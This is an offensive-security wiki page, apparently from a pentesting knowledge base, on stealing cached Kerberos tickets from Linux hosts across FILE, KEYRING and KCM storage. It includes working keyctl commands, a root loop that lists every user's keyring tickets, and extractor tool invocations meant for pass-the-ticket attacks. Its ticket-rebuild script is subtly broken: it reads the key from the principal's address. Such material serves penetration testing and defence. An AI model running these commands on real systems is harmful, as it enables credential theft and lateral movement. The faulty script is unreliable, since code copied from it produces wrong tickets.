---
authors: Hakumarachi
---

# 🛠️ Cached Kerberos tickets

## Theory
### Introduction
On Linux, **tickets can be stored in 3 different way** which indicate **where tickets can be found:**

| Storage     | Details                                                                                                                                   |
|-------------|-------------------------------------------------------------------------------------------------------------------------------------------|
| **FILE**    | Stores tickets in files, by default under **/tmp** directory, in the form **krb5cc_%{uid}**                                               |
| **KEYRING** | Stores tickets in a special space **in the Linux kernel only accessible for the user himself**                                            | 
| **KCM**     | Stores ticket in a LDAP-Like database, by default at **/var/lib/sss/secrets/secrets.ldb** -> This is the default configuration using sssd | 

The variable **default_ccache_name** in the **/etc/krb5.conf** file, which by default has read permission to any user, indicate the type of storage used by the system.

> [!TIP] TIP
> This value can be overwrited by a file inside /etc/krb5.conf.d/
> 
> By default, using sssd, the value is configured into **/etc/krb5.conf.d/kcm_default_ccache**

## Practice

:::tabs

== FILE

Tickets are accessible under the configured directory (**/tmp** by default). 
Those files can directly be used with [Pass-the-tickets](../../kerberos/ptt.md) 

== KEYRING

> [!TIP] TIP
> Keyring content can only be read by the content owner, root himself cannot read other user's keyring content.
> 
> But root can still use `su - $user` !

`keyctl`, which is almost always installed on target using keyring storage, can be used to read keyring content.
```bash
#Fisrt get persistent keyring address
[root@centos01 ~]# keyctl get_persistent @u
30711432

# Show the keyring content at the previously found address
[root@centos01 ~]# keyctl show 30711432
Keyring
  30711432 ---lswrv      0 65534  keyring: _persistent.0
 127492740 --alswrv      0     0   \_ keyring: _krb
 556713767 --alswrv      0     0       \_ user: krb_ccache:primary
1002684101 --alswrv      0     0       \_ keyring: 0
 110355059 --alswrv      0     0           \_ user: __krb5_princ__
 575224320 --als-rv      0     0           \_ big_key: krb5_ccache_conf_data/pa_type/krbtgt\/LAB.LOCAL\@LAB.LOCAL@X-CACHECONF:
 161110247 --als-rv      0     0           \_ big_key: krbtgt/LAB.LOCAL@LAB.LOCAL
 760223933 --alswrv      0     0           \_ user: __krb5_time_offsets__
```

To recompose a kerberos ticket, values of `user: __krb5_princ__`, (110355059 in this example) here,  and `big_key: $SERVICE` (*161110247* in this example) are needed

```bash
# Get __krb5_princ__ value
keyctl print $PRINCIPALS_ADDRESS

# Get big_key: value
keyctl print $KEY_ADDRESS
```

This will output a hex string. Append this as bytes to the kerberos tickets header to retrieve a usable ticket :

```bash
# set ticket header
HEADER='0504000c00010008ffffffff00000000'

# set ticket principal
PRINCIPALS=$(keyctl print $PRINCIPALS_ADDRESS | awk -F : '{print $3}')

#set ticket key
KEY=$(keyctl print $PRINCIPALS_ADDRESS | awk -F : '{print $3}')

# Compose the ticket
ticket=$HEADER$PRINCIPALS$KEY

# Write into file
echo "$ticket" | xxd -r -p >> ticket.ccache
```

[CCacheExtractor](https://github.com/Hakumarachi/ccacheExtractor) can also be used to recompose the ticket from these values
```bash
# Recompose the ticket
python3 ccacheExtractor.py keyring --principals $PRINCIPALS --key $KEY
```

This file can then be used with [Pass-the-tickets](../../kerberos/ptt.md)

> [!TIP] TIP
> Since a joined domain Linux can have a lot of user, it would be tedious to check for each possibility if a ticket is present in the keyring.
> 
> Fortunately, the file **/proc/key-users**, readable by everyone, contains the list of users who are using the keyring.
> 
> As root is then possible to list all ticket and use them directly from the system

```bash
# Print all tickets 
for uid in `awk '{print$1}' /proc/key-users | tr -d :` ; do res=`KRB5CCNAME=KEYRING:persistent:$uid klist 2>&1` ; if [ $? -eq 0 ] ; then echo ; echo === UID $uid === ; echo "$res" ; fi ; done

# Or use a specific ticket
KRB5CCNAME=KEYRING:persistent:$UID #Do kerberos stuff here
```

> [!WARNING] WARNING
> Note that this method permit to list or directly use all tickets, but didn't allow to extract them to use them from another system

> [!SUCCESS] SUCCESS
> [keyringCCacheDumper](https://github.com/Hakumarachi/keyringCCacheDumper) can be used to extract all tickets automatically.

== KCM

When using KCM storage method all tickets are stored into the **.ldb** database file. By default this file is only readable by root user

[CCacheExtractor](https://github.com/Hakumarachi/ccacheExtractor) can be used to extract all tickets from the database.
```bash
#Extract all ccache stored into .ldb database
python3 ccacheExtractor.py kcm ./secrets.ldb
```

Extracted tickets can then be used with [Pass-the-tickets](../../kerberos/ptt.md)
:::
